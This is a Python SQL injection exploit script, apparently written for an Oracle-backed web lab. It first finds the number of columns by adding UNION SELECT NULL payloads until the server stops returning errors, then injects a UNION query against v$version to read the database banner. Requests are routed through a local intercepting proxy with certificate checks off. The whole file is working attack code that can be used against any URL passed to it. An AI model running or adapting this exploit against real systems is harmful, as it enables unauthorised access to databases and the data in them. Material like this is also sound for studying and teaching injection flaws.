import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def get_database_version(url, numCols):
    if numCols == 2:
        payload = "' UNION SELECT banner, NULL FROM v$version--"
        r = requests.get(url + payload, verify=False, proxies=proxies)
        if "Oracle Database" in r.text:
            soup = BeautifulSoup(r.text, 'html.parser')
            version = soup.findAll(string=re.compile("Oracle Database"))
            return version


def exploit_sqli(url):
    counter = 1
    payload = "NULL"
    end = "FROM dual--"
    r = requests.get(url + "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
    while "Internal Server Error" in r.text:
        payload += ",NULL "
        r = requests.get(url+ "' UNION SELECT " + payload + end, verify=False, proxies=proxies)
        counter += 1
    return counter



if __name__ == '__main__':
    url = sys.argv[1]
    numCols = exploit_sqli(url)
    dbVersion = get_database_version(url, numCols)
    print(dbVersion)